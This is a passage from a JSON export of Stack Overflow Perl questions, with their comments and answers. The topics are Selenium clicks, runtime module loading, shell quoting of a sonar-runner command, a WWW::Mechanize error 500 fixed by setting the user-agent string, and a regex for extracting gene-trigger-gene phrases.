style=\"padding-left:4px;\"&gt;&lt;a tabindex=\"-1\"&gt;Launch&lt;/a&gt;&lt;/td&gt;&lt;td style=\"padding-right:4px;padding-left:4px;\"&gt;&lt;img name=\"toolsMenu_imgFlyControl\" src=\"/ibmcognos/skins/corporate/shared/images/dropdown_arrow_banner.gif\" title=\"Launch Options\" alt=\"Launch Options\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script language=\"javascript\"&gt;\nvar ccPopupMessageStrings = eval(\"({ 'IDS_CCPOPUP_DOT':'Dot' , 'IDS_CCPOPUP_CHECKED':'Checked' } )\");\nwith(new CCPopupMenu(\"goto\",\"goto_span\", \"\",\"\", ccPopupMessageStrings))\n{\n\n    setLabel(\"Launch menu\");\n\n    addMenuItem(\"icd\",\"\", \"Cognos Workspace\", \"/ibmcognos/skins/corporate/branding/tools_dashboard.gif\",\"launchApp(\\'IBMCognosDashboard\\')\");\n\n    addMenuItem(\"ice\",\"\", \"Cognos Workspace Advanced\", \"/ibmcognos/skins/corporate/branding/tools_report_studio_bua.gif\",\"launchApp(\\'IBMBusinessInsight\\')\");\n\n    addMenuItem(\"qs\",\"\", \"Query Studio\", \"/ibmcognos/skins/corporate/branding/tools_query_studio.gif\",\"launchApp(\\'QueryStudio\\')\");\n\n    addMenuItem(\"rspro\",\"\", \"Report Studio\", \"/ibmcognos/skins/corporate/branding/tools_report_studio.gif\",\"launchApp(\\'ReportStudioPro\\')\");\n\n    addMenuItem(\"dt\",\"\", \"Drill-through Definitions\", \"/ibmcognos/skins/corporate/branding/tools_drill_through.gif\",\"launchApp(\\'DrillThrough\\')\");\n\n    addMenuSeparator();\n\n    addMenuItem(\"ac\",\"\", \"Reporting Administration\", \"/ibmcognos/skins/corporate/branding/tools_cognos_administration.gif\",\"launchApp(\\'Administration\\')\");\n\n}\n&lt;/script&gt;&lt;/td&gt;\n</code></pre>\n\n<p>Using -\nSelenium Remote Driver 1.20\nSelenium 3.4.0\nRHEL 5.5\nPerl 5.20.1</p>\n\n<p>I am using perl to write my test case.</p>\n\n<p>I am a newbie to Selenium, any help is appreciated. TIA!</p>\n\n<p>After looking at the HTML and inspecting the element, I was able to get to highlight the cell, but I cannot get it to click. </p>\n\n<p>This is what I use in my code -</p>\n\n<pre><code>$driver-&gt;find_element_by_link_text(\"Launch\")-&gt;click();\n$driver-&gt;find_element_by_class_name(\"appOptionsContainer\");\n$driver-&gt;find_element_by_id(\"acmenuItemTR\")-&gt;click();\n</code></pre>\n\n<p>Here is the snapshot -\n<a href=\"https://i.stack.imgur.com/4Qcbl.png\" rel=\"nofollow noreferrer\">Link highlighted</a></p>\n\n<p>This is what I get when I <a href=\"https://i.stack.imgur.com/rB5tS.png\" rel=\"nofollow noreferrer\">inspect the element</a> -</p>\n"}, {"tags": ["perl", "require", "perl-module"], "comments": [{"owner": {"reputation": 17619, "user_id": 7818749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4a72453e116debb802d55e88c2572e?s=128&d=identicon&r=PG&f=1", "display_name": "Gerhard", "link": "https://stackoverflow.com/users/7818749/gerhard"}, "edited": false, "score": 0, "creation_date": 1496669497, "post_id": 44370053, "comment_id": 75741225, "body": "<code>eval &quot;use Module; 1&quot;?</code>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496672037, "post_id": 44370053, "comment_id": 75742982, "body": "I think that eval would suffer, because <code>use</code> is a compile time thing."}, {"owner": {"reputation": 17619, "user_id": 7818749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4a72453e116debb802d55e88c2572e?s=128&d=identicon&r=PG&f=1", "display_name": "Gerhard", "link": "https://stackoverflow.com/users/7818749/gerhard"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496672480, "post_id": 44370053, "comment_id": 75743303, "body": "True yes, I was thinking of testing it with <code>eval</code> but commented to quickly, you have it perfectly summed up in the answer though. @Sobrique"}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 8, "last_activity_date": 1496669619, "creation_date": 1496669619, "answer_id": 44370198, "question_id": 44370053, "link": "https://stackoverflow.com/questions/44370053/use-perl-module-only-when-it-is-needed-within-a-subroutine/44370198#44370198", "title": "Use Perl module only when it is needed within a subroutine", "body": "<p>That's because you're calling <code>require</code> incorrectly.</p>\n\n<p>What you need is:</p>\n\n<pre><code>require JSON::Tiny;\nJSON::Tiny -&gt; import ( 'encode_json' );\n</code></pre>\n\n<p>You can wrap that in an 'eval' too, and test the value of <code>$@</code>:</p>\n\n<pre><code>eval { require JSON::Tiny; };\nwarn $@ if $@;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 6, "last_activity_date": 1496669760, "creation_date": 1496669760, "answer_id": 44370248, "question_id": 44370053, "link": "https://stackoverflow.com/questions/44370053/use-perl-module-only-when-it-is-needed-within-a-subroutine/44370248#44370248", "title": "Use Perl module only when it is needed within a subroutine", "body": "<p>There are two main differences between <code>use</code> and <code>require</code>.</p>\n\n<ol>\n<li><code>use</code> happens at compile time and <code>require</code> happens at runtime.</li>\n<li><code>use</code> calls the <code>import()</code> method in the loaded package (if one exists) and <code>require</code> doesn't.</li>\n</ol>\n\n<p>So you need to add a call to <code>import()</code>.</p>\n\n<pre><code>sub with_json_mod{\n    require JSON::Tiny;\n    JSON::Tiny-&gt;import('encode_json');\n    blah blah blah;\n}\n</code></pre>\n"}], "owner": {"reputation": 747, "user_id": 2474912, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/i6p16.gif?s=128&g=1", "display_name": "JohnnyLoo", "link": "https://stackoverflow.com/users/2474912/johnnyloo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 260, "favorite_count": 0, "accepted_answer_id": 44370198, "answer_count": 2, "score": 1, "last_activity_date": 1537383167, "creation_date": 1496669135, "last_edit_date": 1537383167, "question_id": 44370053, "link": "https://stackoverflow.com/questions/44370053/use-perl-module-only-when-it-is-needed-within-a-subroutine", "title": "Use Perl module only when it is needed within a subroutine", "body": "<p>Imagine my script has these two subs</p>\n\n<pre><code>sub with_json_mod{\n    use JSON::Tiny;\n    blah blah blah;\n}\n\nsub without_json_mod{\n   blah blah blah;\n}\n</code></pre>\n\n<p>I only want to use <code>without_json_mod</code> when <code>JSON::Tiny</code> is not installed. </p>\n\n<p>How can I make Perl not fail if <code>JSON::Tiny</code> is not installed and, instead, use the <code>without_json_mod</code> sub instead?</p>\n\n<p>I tried to call <code>require</code> in the <code>with_json_mod</code> and it seems to work, but it doesn't work when I try to make it import the <code>encode_json</code> sub as in </p>\n\n<pre><code>sub with_json_mod{\n    require JSON::Tiny qw/encode_json/;\n    blah blah blah;\n}\n</code></pre>\n"}, {"tags": ["perl", "shell", "sh", "quoting"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1496666234, "post_id": 44369012, "comment_id": 75739146, "body": "That Perl statement is fine. The asterisks will remain where you put them."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496666241, "post_id": 44369012, "comment_id": 75739157, "body": "What&#39;s not working? How are you using this variable. What are you getting to make you think it&#39;s &#39;broken&#39;?"}, {"owner": {"reputation": 4233, "user_id": 1143387, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/0b9a9c460593d77b3561075ef1889150?s=128&d=identicon&r=PG", "display_name": "sniperd", "link": "https://stackoverflow.com/users/1143387/sniperd"}, "edited": false, "score": 0, "creation_date": 1496666374, "post_id": 44369012, "comment_id": 75739234, "body": "In general for Perl a backslash \\  is the escape character, although this line looks like it would work just fine."}, {"owner": {"reputation": 1, "user_id": 8081257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/T6GyN.jpg?s=128&g=1", "display_name": "onur sandikci", "link": "https://stackoverflow.com/users/8081257/onur-sandikci"}, "edited": false, "score": 0, "creation_date": 1496666661, "post_id": 44369012, "comment_id": 75739409, "body": "Dsonar.java.binaries=&#39;/vob/test/test/**/*.jar&#39; &quot;;  this variable is broken (star)"}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1496666902, "post_id": 44369012, "comment_id": 75739551, "body": "How are you running this command in perl script?"}, {"owner": {"reputation": 1, "user_id": 8081257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/T6GyN.jpg?s=128&g=1", "display_name": "onur sandikci", "link": "https://stackoverflow.com/users/8081257/onur-sandikci"}, "edited": false, "score": 0, "creation_date": 1496667083, "post_id": 44369012, "comment_id": 75739669, "body": "my $cmd = &quot; csh -c &#39;$sonar &#39;&quot;;  print &quot;cmd\\n&quot;;   my $result = system(&quot;($cmd) &gt;&gt; /logs/on.txt 2&gt;&amp;1&quot;);"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 1496669035, "post_id": 44369012, "comment_id": 75740935, "body": "Don&#39;t add important details in the comments. Please <a href=\"https://stackoverflow.com/posts/44369012/edit\">edit your question</a> to include this stuff."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496670156, "post_id": 44369012, "comment_id": 75741665, "body": "Looks like a quoting issue to me. Single quotes within single quotes."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496699855, "post_id": 44369012, "comment_id": 75757514, "body": "Voting to reopen. The OP addressed the issue."}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1496672293, "creation_date": 1496672293, "answer_id": 44371050, "question_id": 44369012, "link": "https://stackoverflow.com/questions/44369012/perl-asterisk-character-issue/44371050#44371050", "title": "Perl asterisk * character issue", "body": "<pre><code>my $sonar = \"/opt/tools/wh/dtd/tools/sonar/sonar-runner-2.4/bin/sonar-runner -Dsonar.host.url=http://sonarqubesonar.com:9000  -Dsonar.projectKey=codeAnalysis.test50 -Dsonar.sourceEncoding=Cp1252 -Dsonar.projectBaseDir='/vob/test/test' -Dsonar.sources='/vob/test/test/app/,/vob/test/test/src'  -Dsonar.projectName='test50' -Dsonar.java.binaries='/vob/test/test/**/*.jar' \";\n</code></pre>\n\n<p>This is how it is called.</p>\n\n<pre><code>my $cmd = \" csh -c '$sonar '\";\nprint \"cmd\\n\";\nmy $result = system(\"($cmd) &gt;&gt; /logs/on.txt 2&gt;&amp;1\");\n</code></pre>\n\n<p>Your problem here I think it 'just' one of nesting too many quotes. </p>\n\n<p>You've got single quotes in your string  - <code>-Dsonar.java.binaries='/vob/test/test/**/*.jar'</code> and single quotes in your <code>$cmd</code>. </p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1496680600, "last_edit_date": 1496680600, "creation_date": 1496675432, "answer_id": 44372032, "question_id": 44369012, "link": "https://stackoverflow.com/questions/44369012/perl-asterisk-character-issue/44372032#44372032", "title": "Perl asterisk * character issue", "body": "<p>The problem is that you don't properly convert the argument for <code>-c</code> into a shell literal by simply putting single quotes around it. In other words, you have a shell command injection bug. Fix:</p>\n\n<pre><code>use String::ShellQuote qw( shell_quote );\n\nmy $sonar_cmd = \"/opt/tools/wh/dtd/tools/sonar/sonar-runner-2.4/bin/sonar-runner ...\";\nmy $outer_cmd = shell_quote('csh', '-c', $sonar_cmd) . ' &gt;/logs/on.txt 2&gt;&amp;1';\nsystem($outer_cmd);\n</code></pre>\n\n<p>But why are you using <code>csh</code>?! You should be avoiding that shell, and avoiding it allows you to use the following (given that <code>$sonar_cmd</code> is a valid bourne shell command):</p>\n\n<pre><code>my $sonar_cmd = \"/opt/tools/wh/dtd/tools/sonar/sonar-runner-2.4/bin/sonar-runner ...\";\nmy $outer_cmd = \"( $sonar_cmd ) /logs/on.txt 2&gt;&amp;1\";\nsystem($outer_cmd);\n</code></pre>\n\n<p>The following also works if <code>$sonar_cmd</code> is just a single \"statement\":</p>\n\n<pre><code>my $sonar_cmd = \"/opt/tools/wh/dtd/tools/sonar/sonar-runner-2.4/bin/sonar-runner ...\";\n$sonar_cmd .= ' /logs/on.txt 2&gt;&amp;1';\nsystem($sonar_cmd);\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8081257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/T6GyN.jpg?s=128&g=1", "display_name": "onur sandikci", "link": "https://stackoverflow.com/users/8081257/onur-sandikci"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 336, "favorite_count": 0, "closed_date": 1496686407, "accepted_answer_id": 44372032, "answer_count": 2, "score": -6, "last_activity_date": 1496680600, "creation_date": 1496665909, "last_edit_date": 1496677181, "question_id": 44369012, "link": "https://stackoverflow.com/questions/44369012/perl-asterisk-character-issue", "closed_reason": "Not suitable for this site", "title": "Perl asterisk * character issue", "body": "<p>How can I escape these outside characters <code>*/</code>?</p>\n\n<p>This command is working on shell screen.</p>\n\n<p>When I add it in a Perl script the <code>*</code> character is broken command:</p>\n\n<pre><code>my $sonar = \"/opt/tools/wh/dtd/tools/sonar/sonar-runner-2.4/bin/sonar-runner -Dsonar.host.url=http://sonarqubesonar.com:9000  -Dsonar.projectKey=codeAnalysis.test50 -Dsonar.sourceEncoding=Cp1252 -Dsonar.projectBaseDir='/vob/test/test' -Dsonar.sources='/vob/test/test/app/,/vob/test/test/src'  -Dsonar.projectName='test50' -Dsonar.java.binaries='/vob/test/test/**/*.jar' \";\n</code></pre>\n\n<p>This is how it is called.</p>\n\n<pre><code>my $cmd = \" csh -c '$sonar '\";\nprint \"cmd\\n\";\nmy $result = system(\"($cmd) &gt;&gt; /logs/on.txt 2&gt;&amp;1\");\n</code></pre>\n\n<p>The error I am getting is:</p>\n\n<p><code>Dsonar.java.binaries='/vob/test/test/**/*.jar' \"; this variable is broken (*)</code></p>\n"}, {"tags": ["perl", "mechanize", "libwww-perl"], "comments": [{"owner": {"reputation": 17619, "user_id": 7818749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4a72453e116debb802d55e88c2572e?s=128&d=identicon&r=PG&f=1", "display_name": "Gerhard", "link": "https://stackoverflow.com/users/7818749/gerhard"}, "edited": false, "score": 3, "creation_date": 1496646957, "post_id": 44363483, "comment_id": 75728596, "body": "where is the rest of the code? where are you setting $url?"}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 8113037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa4eca18ae11c60e9401ac93f264d096?s=128&d=identicon&r=PG&f=1", "display_name": "Sugumar", "link": "https://stackoverflow.com/users/8113037/sugumar"}, "edited": false, "score": 0, "creation_date": 1496656485, "post_id": 44364026, "comment_id": 75733612, "body": "i tried different IE8 string but nothing works can u give me the exact string @andrzej"}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 15, "user_id": 8113037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa4eca18ae11c60e9401ac93f264d096?s=128&d=identicon&r=PG&f=1", "display_name": "Sugumar", "link": "https://stackoverflow.com/users/8113037/sugumar"}, "edited": false, "score": 0, "creation_date": 1496657806, "post_id": 44364026, "comment_id": 75734358, "body": "I have added to the reply exact agent string used for test."}], "tags": [], "owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "is_accepted": false, "score": 2, "last_activity_date": 1496658245, "last_edit_date": 1496658245, "creation_date": 1496648449, "answer_id": 44364026, "question_id": 44363483, "link": "https://stackoverflow.com/questions/44363483/gettting-error-500-when-trying-get-from-website-using-lwpuseragent/44364026#44364026", "title": "Gettting Error 500 when trying Get from website using lwp::useragent", "body": "<p>It seems that the site blocks requests from \"bad\" (undesired) user agents.  You may make <code>WWW::Mechanize</code> (<code>LWP::UserAgent</code>) present itself as another user agent using <code>agent</code> parameter for <code>new</code> or by calling <code>agent</code> method.  Full IE8 identification string fixed the problem.</p>\n\n<p>I have tested it using <code>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1</code>.<br>\n[As listed by \"<a href=\"http://chrispederick.com/work/user-agent-switcher/help/#user-agents\" rel=\"nofollow noreferrer\">User Agent Switcher\" plugin</a> for Firefox] </p>\n\n<p><a href=\"https://raw.githubusercontent.com/chrispederick/user-agent-switcher/master/development/source/content_common/useragentswitcher/xml/useragents.xml\" rel=\"nofollow noreferrer\">Short list of user agents (xml file)</a><br>\n<a href=\"http://techpatterns.com/forums/about304.html\" rel=\"nofollow noreferrer\">Long list of user agents</a></p>\n\n<p><strong>WARNING</strong><br>\nThe site(s) may use or choose to use other means to block unwanted requests.</p>\n"}], "owner": {"reputation": 15, "user_id": 8113037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa4eca18ae11c60e9401ac93f264d096?s=128&d=identicon&r=PG&f=1", "display_name": "Sugumar", "link": "https://stackoverflow.com/users/8113037/sugumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1496658245, "creation_date": 1496646460, "last_edit_date": 1496652893, "question_id": 44363483, "link": "https://stackoverflow.com/questions/44363483/gettting-error-500-when-trying-get-from-website-using-lwpuseragent", "title": "Gettting Error 500 when trying Get from website using lwp::useragent", "body": "<p>Someone help me with this using lwp::Useragent please  </p>\n\n<pre><code>my $mech = WWW::Mechanize-&gt;new(autocheck =&gt; 0);\n$mech-&gt;get($url);\nmy $content=$mech-&gt;content;\n</code></pre>\n\n<p>but getting <strong>Error 500</strong> when trying to get <code>https://camelcamelcamel.com/</code></p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496948866, "post_id": 44361259, "comment_id": 75885057, "body": "Right TH idea was if I get a trig word I look left and right and find the first gene mention rather than first finding the gene mentions. So if I have 2 trigger words in a sentence if I find a gene right and left of the trigger word that is one phrase. for the second trigger if i find a gene left and right of it then it is good but if i don&#39;t find a gene either on the left or the right I discard it."}, {"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496948981, "post_id": 44361259, "comment_id": 75885118, "body": "So basically in line 4 it becomes ADAMTS4 have been found to <b>upregulated</b> by MMP3 and MMP3 are <b>downregulated</b> by SMAD3"}, {"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1497188740, "post_id": 44361259, "comment_id": 75963069, "body": "Well again to answer your questions 1) and 3) I am right now attempting to catch only one gene despite 2 being present. I will try to capture the first instance and not the second in both right and left. Some loss of info but that is acceptable.  so the second line should be &quot;SPARC regulate the expression of TGFB1&quot; 2)in line 4 once one triple of gene-trigger-gene is captured it treats the next part of the line to search for the same pattern again."}, {"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1497353783, "post_id": 44361259, "comment_id": 76032467, "body": "I am sorry that I haven&#39;t clear in my description. I meant was that I am not matching the period at all. My output is just the &#39;gene-trig-gene&#39; matching with no concern for the occurrence of the period. I hope now I am clear."}, {"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1497355055, "post_id": 44361259, "comment_id": 76033435, "body": "But I I guess the solution you have given is good. Thanks a million for your help."}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "edited": false, "score": 0, "creation_date": 1496637800, "post_id": 44361482, "comment_id": 75725252, "body": "One more query. If I am looking at lists of 40000 words/phrases and about the same number of sentences is there an more efficient way of doing this?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "edited": false, "score": 0, "creation_date": 1496638173, "post_id": 44361482, "comment_id": 75725359, "body": "The approach taken by my solution is quite efficient (as long as you use Perl 5.10 or newer)."}, {"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "edited": false, "score": 0, "creation_date": 1496927641, "post_id": 44361482, "comment_id": 75870802, "body": "Just one more query, if my names have digits, will the regexp work because I have been unable to execute if the names have numbers in them like ABC1."}, {"owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "edited": false, "score": 0, "creation_date": 1496928462, "post_id": 44361482, "comment_id": 75871458, "body": "I edited the question with actual code I am running and the input file. This is not working and am not able to understand why."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "edited": false, "score": 0, "creation_date": 1497210794, "post_id": 44361482, "comment_id": 75970291, "body": "@ary, You miscopied <code>(...)</code> into <code>{...}</code>, and I fixed the problem that caused the first line of output to be <code>SPARC is an activator of SPARC</code>."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1497371290, "last_edit_date": 1497371290, "creation_date": 1496635153, "answer_id": 44361482, "question_id": 44361259, "link": "https://stackoverflow.com/questions/44361259/perl-code-to-find-an-array-element-in-a-sentence-and-then-to-look-either-side-of/44361482#44361482", "title": "Perl code to find an array element in a sentence and then to look either side of the match for another string to be matched from a different array", "body": "<pre><code>my $trig_re = join '|', map quotemeta, @trigs;\n$trig_re = qr/\\b(?:$trig_re)/;\n\nmy $gene_re = join '|', map quotemeta, @genes;\n$gene_re = qr/\\b(?:$gene_re)\\b/;\n\nmy $re = qr/\n   (\n      $gene_re\n      (?:(?!$gene_re|$trig_re).)*\n      $trig_re\n      (?:(?!$gene_re|$trig_re).)*\n      $gene_re\n   )\n/sx;\n\nfor my $string (@strings) {\n   say $1 while $string =~ /$re/g;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>SPARC is an activator of SPARCL1\nSPARC regulate the expression of TGFB1\nADAMTS4 have been found to upregulated by MMP3\nMMP3 are downregulated by SMAD3\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 7700359, "user_type": "registered", "accept_rate": 75, "profile_image": 